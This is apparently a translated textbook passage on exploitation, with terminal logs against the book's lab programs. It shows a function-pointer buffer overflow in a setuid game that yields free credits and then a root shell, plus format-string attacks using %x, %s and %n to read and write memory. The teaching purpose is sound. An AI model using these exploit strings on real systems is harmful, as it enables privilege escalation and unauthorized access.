Pick a number between 1 and 20: 5
The winning number is 17
Sorry, you didn't win.

You now have 60 credits
Would you like to play again? (y/n)  n
-=[ Game of Chance Menu ]=-
1 - Play the Pick a Number game
2 - Play the No Match Dealer game
3 - Play the Find the Ace game
4 - View current high score
5 - Change your user name
6 - Reset your account at 100 credits

7 - Quit
[Name: Jon Erickson]
[You have 60 credits] ->
[1]+  Stopped                 ./game_of_chance
reader@hack ing:~/booksrc $
```

你可以通过按 CTRL-Z 来暂时挂起当前进程。此时，`last_game`变量已被设置为 1，所以下次选择 1 时，函数指针将直接被调用而不会被更改。回到 shell 后，我们找出一个合适的溢出缓冲区，稍后可以作为名称粘贴进去。通过带有调试符号重新编译源代码并使用 GDB 在`main()`上设置断点来运行程序，我们可以探索内存。如下面的输出所示，名称缓冲区位于用户结构中的`current_game`指针 100 字节处。

```
reader@hacking:~/booksrc $ gcc -g game_of_chance.c
reader@hacking:~/booksrc $ gdb -q ./a.out 
Using host libthread_db library "/lib/tls/i686/cmov/libthread_db.so.1".
(gdb) break main
Breakpoint 1 at 0x8048813: file game_of_chance.c, line 41.
(gdb) run
Starting program: /home/reader/booksrc/a.out

Breakpoint 1, main () at game_of_chance.c:41
41         srand(time(0)); // Seed the randomizer with the current time.
(gdb) p player
$1 = {uid = 0, credits = 0, highscore = 0, name = '\0' <repeats 99 times>, 
current_game = 0}
(gdb) x/x &player.name
0x804b66c <player+12>:  0x00000000
(gdb) x/x &player.current_game
0x804b6d0 <player+112>: 0x00000000
(gdb) p 0x804b6d0 - 0x804b66c
$2 = 100
(gdb) quit
The program is running.  Exit anyway? (y or n) y
reader@hacking:~/booksrc $
```

使用这些信息，我们可以生成一个缓冲区来溢出名称变量。这可以在程序恢复时复制并粘贴到交互式“机会游戏”程序中。要返回挂起的进程，只需输入`fg`，这是*前台*的缩写。

```
reader@hacking:~/booksrc $ perl -e 'print "A"x100 . "BBBB" . "\n"'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAABBBB
reader@hacking:~/booksrc $ fg
./game_of_chance
5

Change user name

Enter your new name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
Your name has been changed.

-=[ Game of Chance Menu ]=-
1 - Play the Pick a Number game
2 - Play the No Match Dealer game
3 - Play the Find the Ace game
4 - View current high score
5 - Change your user name
6 - Reset your account at 100 credits
7 - Quit
[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB]
[You have 60 credits] ->  1

[DEBUG] current_game pointer @ 0x42424242
Segmentation fault 
reader@hacking:~/booksrc $
```

选择菜单选项 5 来更改用户名，并将溢出缓冲区粘贴进去。这将用`0x42424242`覆盖函数指针。当再次选择菜单选项 1 时，程序在尝试调用函数指针时会崩溃。这证明了执行可以被控制；现在所需的就是一个有效的地址来替换*BBBB*。

`nm`命令列出了目标文件中的符号。这可以用来查找程序中各种函数的地址。

```
reader@hacking:~/booksrc $ nm game_of_chance
0804b508 d _DYNAMIC
0804b5d4 d _GLOBAL_OFFSET_TABLE_
080496c4 R _IO_stdin_used
         w _Jv_RegisterClasses
0804b4f8 d __CTOR_END__
0804b4f4 d __CTOR_LIST__
0804b500 d __DTOR_END__
0804b4fc d __DTOR_LIST__
0804a4f0 r __FRAME_END__
0804b504 d __JCR_END__
0804b504 d __JCR_LIST__
0804b630 A __bss_start
0804b624 D __data_start
08049670 t __do_global_ctors_aux
08048610 t __do_global_dtors_aux
0804b628 D __dso_handle
         w __gmon_start__
08049669 T __i686.get_pc_thunk.bx
0804b4f4 d __init_array_end
0804b4f4 d __init_array_start
080495f0 T __libc_csu_fini
08049600 T __libc_csu_init
         U __libc_start_main@@GLIBC_2.0
0804b630 A _edata
0804b6d4 A _end
080496a0 T _f ini
080496c0 R _fp_hw
08048484 T _init
080485c0 T _start
080485e4 t call_gmon_start
         U close@@GLIBC_2.0
0804b640 b completed.1
0804b624 W data_start
080490d1 T dealer_no_match
080486fc T dump
080486d1 T ec_malloc
         U exit@@GLIBC_2.0
08048684 T fatal
080492bf T find_the_ace
08048650 t frame_dummy
080489cc T get_player_data
         U getuid@@GLIBC_2.0
08048d97 T input_name
08048d70 T jackpot
08048803 T main
         U malloc@@GLIBC_2.0
         U open@@GLIBC_2.0
0804b62c d p.0
         U perror@@GLIBC_2.0
08048fde T pick_a_number
08048f23 T play_the_game
0804b660 B player
08048df8 T print_cards
         U printf@@GLIBC_2.0
         U rand@@GLIBC_2.0
         U read@@GLIBC_2.0
08048aaf T register_new_player
         U scanf@@GLIBC_2.0
08048c72 T show_highscore
         U srand@@GLIBC_2.0
         U strcpy@@GLIBC_2.0
         U strncat@@GLIBC_2.0
08048e91 T take_wager
         U time@@GLIBC_2.0
08048b72 T update_player_data
         U write@@GLIBC_2.0 
reader@hacking:~/booksrc $
```

`jackpot()`函数是这种攻击的一个很好的目标。尽管游戏给出的赔率很差，但如果将`current_game`函数指针小心地覆盖为`jackpot()`函数的地址，您甚至不需要玩游戏就能赢得积分。相反，将直接调用`jackpot()`函数，发放 100 积分，并使玩家处于有利地位。

此程序从标准输入获取输入。菜单选择可以脚本化在一个单独的缓冲区中，然后通过程序的标准输入管道传输。这些选择将像输入一样被做出。以下示例将选择菜单项 1，尝试猜测数字 7，当被要求再次玩游戏时选择`n`，最后选择菜单项 7 以退出。

```
reader@hacking:~/booksrc $ perl -e 'print "1\n7\nn\n7\n"' | ./game_of_chance 
-=[ Game of Chance Menu ]=-
1 - Play the Pick a Number game
2 - Play the No Match Dealer game
3 - Play the Find the Ace game
4 - View current high score
5 - Change your user name
6 - Reset your account at 100 credits
7 - Quit
[Name: Jon Erickson]
[You have 60 credits] ->  
[DEBUG] current_game pointer @ 0x08048fde

####### Pick a Number ######
This game costs 10 credits to play. Simply pick a number
between 1 and 20, and if you pick the winning number, you
will win the jackpot of 100 credits!

10 credits have been deducted from your account.
Pick a number between 1 and 20: The winning number is 20
Sorry, you didn't win.

You now have 50 credits
Would you like to play again? (y/n)  -=[ Game of Chance Menu ]=-
1 - Play the Pick a Number game
2 - Play the No Match Dealer game
3 - Play the Find the Ace game
4 - View current high score
5 - Change your user name
6 - Reset your account at 100 credits
7 - Quit
[Name: Jon Erickson]
[You have 50 credits] ->  
Thanks for playing! Bye. 
reader@hacking:~/booksrc $
```

同样的技术可以用来脚本化攻击所需的所有内容。以下行将玩一次“选择一个数字”游戏，然后更改用户名为 100 个`A`，后面跟着`jackpot()`函数的地址。这将溢出`current_game`函数指针，所以当再次玩“选择一个数字”游戏时，将直接调用`jackpot()`函数。

```
reader@hacking:~/booksrc $ perl -e 'print "1\n5\nn\n5\n" . "A"x100 . "\x70\
x8d\x04\x08\n" . "1\nn\n" . "7\n"'
1
5
n
5
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAp?
1
n
7
reader@hack ing:~/booksrc $ perl -e 'print "1\n5\nn\n5\n" . "A"x100 . "\x70\
x8d\x04\x08\n" . "1\nn\n" . "7\n"' | ./game_of_chance 
-=[ Game of Chance Menu ]=-
1 - Play the Pick a Number game
2 - Play the No Match Dealer game
3 - Play the Find the Ace game
4 - View current high score
5 - Change your user name
6 - Reset your account at 100 credits
7 - Quit
[Name: Jon Erickson]
[You have 50 credits] ->  
[DEBUG] current_game pointer @ 0x08048fde

####### Pick a Number ######
This game costs 10 credits to play. Simply pick a number
between 1 and 20, and if you pick the winning number, you
will win the jackpot of 100 credits!

10 credits have been deducted from your account.
Pick a number between 1 and 20: The winning number is 15
Sorry, you didn't win.

You now have 40 credits
Would you like to play again? (y/n)  -=[ Game of Chance Menu ]=-
1 - Play the Pick a Number game
2 - Play the No Match Dealer game
3 - Play the Find the Ace game
4 - View current high score
5 - Change your user name
6 - Reset your account at 100 credits
7 - Quit
[Name: Jon Erickson]
[You have 40 credits] ->  
Change user name
Enter your new name: Your name has been changed.

-=[ Game of Chance Menu ]=-
1 - Play the Pick a Number game
2 - Play the No Match Dealer game
3 - Play the Find the Ace game
4 - View current high score
5 - Change your user name
6 - Reset your account at 100 credits
7 - Quit
[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAp?]
[You have 40 credits] ->

[DEBUG] current_game po inter @ 0x08048d70
*+*+*+*+*+* JACKPOT *+*+*+*+*+*
You have won the jackpot of 100 credits!

You now have 140 credits
Would you like to play again? (y/n)  -=[ Game of Chance Menu ]=-
1 - Play the Pick a Number game
2 - Play the No Match Dealer game
3 - Play the Find the Ace game
4 - View current high score
5 - Change your user name
6 - Reset your account at 100 credits
7 - Quit
[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAp?]
[You have 140 credits] ->  
Thanks for playing! Bye. 
reader@hacking:~/booksrc $
```

在确认这种方法有效后，它可以扩展以获得任意数量的积分。

```
reader@hacking:~/booksrc $ perl -e 'print "1\n5\nn\n5\n" . "A"x100 . "\x70\
x8d\x04\x08\n" . "1\n" . "y\n"x10 . "n\n5\nJon Erickson\n7\n"' | ./
game_of_chance 
-=[ Game of Chance Menu ]=-
1 - Play the Pick a Number game
2 - Play the No Match Dealer game
3 - Play the Find the Ace game
4 - View current high score
5 - Change your user name
6 - Reset your account at 100 credits
7 - Quit
[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAp?]
[You have 140 credits] ->
[DEBUG] current_game pointer @ 0x08048fde

####### Pick a Number ######
This game costs 10 credits to play. Simply pick a number
between 1 and 20, and if you pick the winning number, you
will win the jackpot of 100 credits!

10 credits have been deducted from your account.
Pick a number between 1 and 20: The winning number is 1
Sorry, you didn't win.

You now have 130 credits
Would you like to play again? (y/n)  -=[ Game of Chance Menu ]=-
1 - Play the Pick a Number game
2 - Play the No Match Dealer game
3 - Play the Find the Ace game
4 - View current high score
5 - Change your user name
6 - Reset your account at 100 credits
7 - Quit
[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAp?]
[You have 130 credits] ->
Change user name
Enter your new name: Your name has been changed.

-=[ Game of Chance Menu ]=-
1 - Play the Pick a Number game
2 - Play the No Match Dealer game
3 - Play the Find the Ace game
4 - View current high score
5 - Change your user name
6 - Reset your account at 100 credits
7 - Quit
[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAp?]
[You have 130 credits] ->
[DEBUG] current_game pointer @ 0x08048d70
*+*+*+*+*+* JACKPOT *+*+*+*+*+*
You have won the jackpot of 100 credits!

You now have 230 credits
Would you like to play again? (y/n)
[DEBUG] current_game pointer @ 0x08048d70
*+*+*+*+*+* JACKPOT *+*+*+*+*+*
You have won the jackpot of 100 credits!

You now have 330 credits
Would you like to play again? (y/n)
[DEBUG] current_game pointer @ 0x08048d70
*+*+*+*+*+* JACKPOT *+*+*+*+*+*
You have won the jackpot of 100 credits!

You now have 430 credits
Would you like to play again? (y/n)
[DEBUG] current_game pointer @ 0x08048d70
*+*+*+*+*+* JACKPOT *+*+*+*+*+*
You have won the jackpot of 100 credits!

You now have 530 credits
Would you like to play again? (y/n)
[DEBUG] current_game pointer @ 0x08048d70
*+*+*+*+*+* JACKPOT *+*+*+*+*+*
You have won the jackpot of 100 credits!

You now have 630 credits
Would you like to play again? (y/n)
[DEBUG] current_game pointer @ 0x08048d70
*+*+*+*+*+* JACKPOT *+*+*+*+*+*
You have won the jackpot of 100 credits!

You now have 730 credits
Would you like to play aga in? (y/n)
[DEBUG] current_game pointer @ 0x08048d70
*+*+*+*+*+* JACKPOT *+*+*+*+*+*
You have won the jackpot of 100 credits!

You now have 830 credits
Would you like to play again? (y/n)
[DEBUG] current_game pointer @ 0x08048d70
*+*+*+*+*+* JACKPOT *+*+*+*+*+*
You have won the jackpot of 100 credits!

You now have 930 credits
Would you like to play again? (y/n)
[DEBUG] current_game pointer @ 0x08048d70
*+*+*+*+*+* JACKPOT *+*+*+*+*+*
You have won the jackpot of 100 credits!

You now have 1030 credits
Would you like to play again? (y/n)
[DEBUG] current_game pointer @ 0x08048d70
*+*+*+*+*+* JACKPOT *+*+*+*+*+*
You have won the jackpot of 100 credits!

You now have 1130 credits
Would you like to play again? (y/n)
[DEBUG] current_game pointer @ 0x08048d70
*+*+*+*+*+* JACKPOT *+*+*+*+*+*
You have won the jackpot of 100 credits!

You now have 1230 credits
Would you like to play again? (y/n)  -=[ Game of Chance Menu ]=-
1 - Play the Pick a Number game
2 - Play the No Match Dealer game
3 - Play the Find the Ace game
4 - View current high score
5 - Change your user name
6 - Reset your account at 100 credits
7 - Quit
[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAp?]
[You have 1230 credits] ->
Change user name
Enter your new name: Your name has been changed.

-=[ Game of Chance Menu ]=-
1 - Play the Pick a Number game
2 - Play the No Match Dealer game
3 - Play the Find the Ace game
4 - View current high score
5 - Change your user name
6 - Reset your account at 100 credits
7 - Quit

[Name: Jon Erickson]
[You have 1230 credits] ->
Thanks for playing! Bye.
reader@hacking:~/booksrc $
```

如您可能已经注意到的，此程序还以 suid root 运行。这意味着 shellcode 可以用来做比赢得免费积分更多的事情。与基于堆的溢出一样，shellcode 可以存储在环境变量中。在构建合适的攻击缓冲区后，该缓冲区被管道传输到`game_of_chance`的标准输入。注意 cat 命令中在攻击缓冲区后面的破折号参数。这告诉 cat 程序在攻击缓冲区之后发送标准输入，返回输入控制。即使 root shell 不显示其提示符，它仍然可访问，并且仍然提升权限。

```
reader@hacking:~/booksrc $ export SHELLCODE=$(cat ./shellcode.bin)
reader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./game_of_chance
SHELLCODE will be at 0xbffff9e0
reader@hacking:~/booksrc $ perl -e 'print "1\n7\nn\n5\n" . "A"x100 . "\xe0\
xf9\xff\xbf\n" . "1\n"' > exploit_buffer
reader@hacking:~/booksrc $ cat exploit_buffer - | ./game_of_chance 
-=[ Game of Chance Menu ]=-
1 - Play the Pick a Number game
2 - Play the No Match Dealer game
3 - Play the Find the Ace game
4 - View current high score
5 - Change your user name
6 - Reset your account at 100 credits
7 - Quit
[Name: Jon Erickson]
[You have 70 credits] ->
[DEBUG] current_game pointer @ 0x08048fde

####### Pick a Number ######
This game costs 10 credits to play. Simply pick a number
between 1 and 20, and if you pick the winning number, you
will win the jackpot of 100 credits!

10 credits have been deducted from your account.
Pick a number between 1 and 20: The winning number is 2
Sorry, you didn't win.

You now have 60 credits
Would you like to play again? (y/n)  -=[ Game of Chance Menu ]=-
1 - Play the Pick a Number game
2 - Play the No Match Dealer game
3 - Play the Find the Ace game
4 - View current high score
5 - Change your user name
6 - Reset your account at 100 credits

7 - Quit
[Name: Jon Erickson]
[You have 60 credits] ->  
Change user name
Enter your new name: Your name has been changed.

-=[ Game of Chance Menu ]=-
1 - Play the Pick a Number game
2 - Play the No Match Dealer game
3 - Play the Find the Ace game
4 - View current high score
5 - Change your user name
6 - Reset your account at 100 credits
7 - Quit
[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAp?]
[You have 60 credits] ->  
[DEBUG] current_game pointer @ 0xbffff9e0

whoami
root
id
uid=0(root) gid=999(reader)
groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(
plugdev),104(scanner),112(netdev),113(lpadmin),115(powerdev),117(admin),999(re
ader)
```

# 格式化字符串

格式化字符串漏洞攻击是另一种可以用来控制特权程序的技术。与缓冲区溢出攻击一样，*格式化字符串漏洞攻击*也依赖于可能不会对安全性产生明显影响的编程错误。幸运的是，对于程序员来说，一旦知道了这种技术，就相当容易发现格式化字符串漏洞并消除它们。尽管格式化字符串漏洞现在已不太常见，但以下技术也可以用于其他情况。

## 格式化参数

到现在为止，您应该对基本的格式化字符串相当熟悉了。它们在之前的程序中广泛使用了像`printf()`这样的函数。使用格式化字符串的函数，如`printf()`，简单地评估传递给它的格式化字符串，并在遇到格式参数时执行特殊操作。每个格式参数都期望传递一个额外的变量，所以如果格式字符串中有三个格式参数，那么应该有更多的函数参数（除了格式字符串参数）。

回想一下上一章中解释的各种格式参数。

| 参数 | 输入类型 | 输出类型 |
| --- | --- | --- |
| `%d` | 值 | 十进制 |
| `%u` | 值 | 无符号十进制 |
| `%x` | 值 | 十六进制 |
| `%s` | 指针 | 字符串 |
| `%n` | 指针 | 已写入的字节数 |

上一章演示了更常见的格式参数的使用，但忽略了较少见的 `%n` 格式参数。`fmt_uncommon.c` 代码演示了其使用。

### fmt_uncommon.c

```
#include <stdio.h>
#include <stdlib.h>

int main() {
   int A = 5, B = 7, count_one, count_two;

   // Example of a %n format string
   printf("The number of bytes written up to this point X%n is being stored in 
count_one, and the number of bytes up to here X%n is being stored in 
count_two.\n", &count_one, &count_two);

   printf("count_one: %d\n", count_one);
   printf("count_two: %d\n", count_two);

   // Stack example
   printf("A is %d and is at %08x.  B is %x.\n", A, &A, B);

   exit(0); 
}
```

该程序在其 `printf()` 语句中使用两个 `%n` 格式参数。以下是程序编译和执行的输出。

```
reader@hacking:~/booksrc $ gcc fmt_uncommon.c 
reader@hacking:~/booksrc $ ./a.out 
The number of bytes written up to this point X is being stored in count_one, and the
 number of 
bytes up to here X is being stored in count_two.
count_one: 46
count_two: 113
A is 5 and is at bffff7f4\.  B is 7\. 
reader@hacking:~/booksrc $
```

`%n` 格式参数独特之处在于它写入数据而不显示任何内容，与读取然后显示数据相反。当格式函数遇到 `%n` 格式参数时，它将函数已写入的字节数写入对应函数参数中的地址。在 `fmt_uncommon` 中，这是在两个地方完成的，使用一元地址运算符将此数据写入变量 `count_one` 和 `count_two`，分别。然后输出这些值，揭示在第一个 `%n` 之前找到了 46 个字节，在第二个 `%n` 之前找到了 113 个。

最后的栈示例很方便地过渡到解释栈在格式字符串中的作用：

```
	printf("A is %d and is at %08x.  B is %x.\n", A, &A, B);
```

当调用此 `printf()` 函数（就像调用任何函数一样），参数以相反的顺序推送到栈中。首先是 `B` 的值，然后是 `A` 的地址，接着是 `A` 的值，最后是格式字符串的地址。

栈看起来就像这里的图示。

格式函数逐字符遍历格式字符串。如果字符不是格式参数的开始（由百分号指定），则字符被复制到输出。如果遇到格式参数，则采取相应的操作，使用与该参数对应的栈中的参数。

![](img/httpatomoreillycomsourcenostarchimages254207.png.jpg)

图 0x300-3。

但如果只有两个参数被推送到栈中，而格式字符串使用了三个格式参数，会怎样呢？尝试从栈示例的 `printf()` 行中移除最后一个参数，使其与下面的行匹配。

```
	printf("A is %d and is at %08x.  B is %x.\n", A, &A);
```

这可以在编辑器中完成，或者使用一点 `sed` 魔法。

```
reader@hacking:~/booksrc $ sed -e 's/, B)/)/' fmt_uncommon.c > fmt_uncommon2.c
reader@hacking:~/booksrc $ diff fmt_uncommon.c fmt_uncommon2.c 
14c14
<    printf("A is %d and is at %08x.  B is %x.\n", A, &A, B);
---
>       printf("A is %d and is at %08x.  B is %x.\n", A, &A);
reader@hacking:~/booksrc $ gcc fmt_uncommon2.c 
reader@hacking:~/booksrc $ ./a.out
The number of bytes written up to this point X is being stored in count_one, and the
 number of 
bytes up to here X is being stored in count_two.
count_one: 46
count_two: 113
A is 5 and is at bffffc24\.  B is b7fd6ff4\. 
reader@hacking:~/booksrc $
```

结果是 `b7fd6ff4`。`b7fd6ff4` 是什么意思？结果证明，由于没有值被推送到栈中，格式函数只是从第三参数应该存在的地方（通过增加当前帧指针）拉取数据。这意味着 `0xb7fd6ff4` 是格式函数栈帧下面的第一个值。

这是一个应该记住的有趣细节。如果有一种方法可以控制传递给或期望格式函数的参数数量，那将非常有用。幸运的是，有一个相当常见的编程错误允许这样做。

## 格式字符串漏洞

有时程序员使用 `printf(string)` 而不是 `printf("%s", string)` 来打印字符串。从功能上讲，这没问题。格式函数接收字符串的地址，而不是格式字符串的地址，并遍历字符串，打印每个字符。这两种方法的示例在 fmt_vuln.c 中展示。

### fmt_vuln.c

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
   char text[1024];
   static int test_val = -72;

   if(argc < 2) {
      printf("Usage: %s <text to print>\n", argv[0]);
      exit(0);
   }
   strcpy(text, argv[1]);

   printf("The right way to print user-controlled input:\n");
   printf("%s", text);

   printf("\nThe wrong way to print user-controlled input:\n");
   printf(text);

   printf("\n");

   // Debug output
   printf("[*] test_val @ 0x%08x = %d 0x%08x\n", &test_val, test_val, 
test_val);

   exit(0);
}
```

以下输出显示了 fmt_vuln.c 的编译和执行过程。

```
reader@hacking:~/booksrc $ gcc -o fmt_vuln fmt_vuln.c 
reader@hacking:~/booksrc $ sudo chown root:root ./fmt_vuln
reader@hacking:~/booksrc $ sudo chmod u+s ./fmt_vuln
reader@hacking:~/booksrc $ ./fmt_vuln testing
The right way to print user-controlled input:
testing
The wrong way to print user-controlled input:
testing
[*] test_val @ 0x08049794 = -72 0xffffffb8 
reader@hacking:~/booksrc $
```

两种方法似乎都可以与字符串 *testing* 一起工作。但如果字符串包含格式参数会怎样呢？格式函数应该尝试评估格式参数，并通过增加帧指针来访问适当的函数参数。但正如我们之前看到的，如果适当的函数参数不存在，增加帧指针将引用前一个栈帧中的内存。

```
reader@hacking:~/booksrc $ ./fmt_vuln testing %x
The right way to print user-controlled input:
testing%x
The wrong way to print user-controlled input:
testingbffff3e0
[*] test_val @ 0x08049794 = -72 0xffffffb8 
reader@hacking:~/booksrc $
```

当使用 `%x` 格式参数时，打印了栈中四字节单词的十六进制表示。这个过程可以重复使用来检查栈内存。

```
reader@hacking:~/booksrc $ ./fmt_vuln $(perl -e 'print "%08x."x40')
The right way to print user-controlled input:
%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
.%08x.
%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
.%08x.
%08x.%08x.
The wrong way to print user-controlled input:
bffff320.b7fe75fc.00000000.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e
.30252
e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e
.30252e78.2
52e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78
.252e78
38.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.
[*] test_val @ 0x08049794 = -72 0xffffffb8 
reader@hacking:~/booksrc $
```

这就是低栈内存的样貌。记住，由于小端架构，每个四字节单词是反向的。字节`0x25, 0x30, 0x38, 0x78`和`0x2e`似乎重复很多。想知道这些字节是什么吗？

```
reader@hacking:~/booksrc $ printf "\x25\x30\x38\x78\x2e\n"
%08x. 
reader@hacking:~/booksrc $
```

如您所见，它们是格式字符串本身的内存。因为格式函数始终位于最高的栈帧中，只要格式字符串存储在栈上的任何位置，它就会位于当前帧指针下方（在更高的内存地址）。这个事实可以用来控制格式函数的参数。如果使用通过引用传递的格式参数，如 `%s` 或 `%n`，这尤其有用。

## 从任意内存地址读取

`%s` 格式参数可以用来从任意内存地址读取。由于可以读取原始格式字符串的数据，原始格式字符串的一部分可以用来向 `%s` 格式参数提供一个地址，如下所示：

```
reader@hacking:~/booksrc $ ./fmt_vuln AAAA%08x.%08x.%08x.%08x
The right way to print user-controlled input:
AAAA%08x.%08x.%08x.%08x
The wrong way to print user-controlled input:
AAAAbffff3d0.b7fe75fc.00000000.41414141
[*] test_val @ 0x08049794 = -72 0xffffffb8
reader@hacking:~/booksrc $
```

`0x41` 的四个字节表明第四个格式参数正在从格式字符串的起始位置读取以获取其数据。如果第四个格式参数是 `%s` 而不是 `%x`，格式函数将尝试打印位于 `0x41414141` 的字符串。这将导致程序在段错误中崩溃，因为这不是一个有效的地址。但如果使用有效的内存地址，这个过程可以用来读取位于该内存地址的字符串。

```
reader@hacking:~/booksrc $ env | grep PATH
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
reader@hacking:~/booksrc $ ./getenvaddr PATH ./fmt_vuln
PATH will be at 0xbffffdd7
reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\xd7\xfd\xff\xbf")%08x.%08x.%08x.%s
The right way to print user-controlled input:
????%08x.%08x.%08x.%s
The wrong way to print user-controlled input:
????bffff3d0.b7fe75fc.00000000./usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:
/bin:/
usr/games
[*] test_val @ 0x08049794 = -72 0xffffffb8
reader@hacking:~/booksrc $
```

在这里，使用 `getenvaddr` 程序来获取环境变量 `PATH` 的地址。由于程序名 *fmt_vuln* 比程序名 *getenvaddr* 少两个字节，所以地址上加了四，由于字节序的原因，字节被反转。`%s` 的第四个格式参数从格式字符串的起始位置读取，认为它是作为函数参数传递的地址。由于这个地址是 `PATH` 环境变量的地址，所以它被打印出来，就像将环境变量的指针传递给 `printf()` 一样。

现在已知栈帧末尾和格式字符串内存起始之间的距离，可以省略 `%x` 格式参数中的字段宽度参数。这些格式参数只需要用来遍历内存。使用这种技术，任何内存地址都可以作为字符串来检查。

## 向任意内存地址写入

如果可以使用 `%s` 格式参数读取任意内存地址，那么你应该能够使用相同的技巧与 `%n` 一起写入任意内存地址。现在事情变得有趣了。

`test_val` 变量已经在 fmt_vuln.c 程序的调试语句中打印其地址和值，这正是一个容易被覆盖的地方。测试变量位于 `0x08049794`，因此通过使用类似的技术，你应该能够向该变量写入数据。

```
reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\xd7\xfd\xff\xbf")%08x.%08x.%08x.%s
The right way to print user-controlled input:
????%08x.%08x.%08x.%s
The wrong way to print user-controlled input:
????bffff3d0.b7fe75fc.00000000./usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:
/bin:/
usr/games
[*] test_val @ 0x08049794 = -72 0xffffffb8
reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x94\x97\x04\x08")%08x.%08x.%08x.%n
The right way to print user-controlled input:
??%08x.%08x.%08x.%n
The wrong way to print user-controlled input:
??bffff3d0.b7fe75fc.00000000.
[*] test_val @ 0x08049794 = 31 0x0000001f 
reader@hacking:~/booksrc $
```

如此所示，`test_val` 变量确实可以使用 `%n` 格式参数被覆盖。测试变量中的结果值取决于在 `%n` 之前写入的字节数。这可以通过操作字段宽度选项来更好地控制。

```
reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x94\x97\x04\x08")%x%x%x%n
The right way to print user-controlled input:
??%x%x%x%n
The wrong way to print user-controlled input:
??bffff3d0b7fe75fc0
[*] test_val @ 0x08049794 = 21 0x00000015
reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x94\x97\x04\x08")%x%x%100x%n
The right way to print user-controlled input:
??%x%x%100x%n
The wrong way to print user-controlled input:
??bffff3d0b7fe75fc
0
[*] test_val @ 0x08049794 = 120 0x00000078
reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x94\x97\x04\x08")%x%x%180x%n
The right way to print user-controlled input:
??%x%x%180x%n
The wrong way to print user-controlled input:
??bffff3d0b7fe75fc
0
[*] test_val @ 0x08049794 = 200 0x000000c8
reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x94\x97\x04\x08")%x%x%400x%n
The right way to print user-controlled input:
??%x%x%400x%n
The wrong way to print user-controlled input:
??bffff3d0b7fe75fc
0
[*] test_val @ 0x08049794 = 420 0x000001a4 
reader@hacking:~/booksrc $
```

通过在 `%n` 之前的格式参数中操作字段宽度选项，可以插入一定数量的空格，导致输出中出现一些空白行。这些行反过来可以用来控制 `%n` 格式参数之前写入的字节数。这种方法适用于较小的数字，但对于较大的数字，如内存地址，则不适用。

通过查看 `test_val` 值的十六进制表示，很明显最低有效字节可以很好地控制。（记住，最低有效字节实际上位于四个字节的内存单词的第一个字节。）这个细节可以用来写入整个地址。如果按顺序在连续的内存地址上写入四次，最低有效字节可以写入四个字节的每个字节，如下所示：

```
`Memory                       94 95 96 97`
First write to 0x08049794    AA 00 00 00
Second write to 0x08049795      BB 00 00 00
Third write to 0x08049796          CC 00 00 00
Fourth write to 0x08049797            DD 00 00 00
`Result                       AA BB CC DD`
```

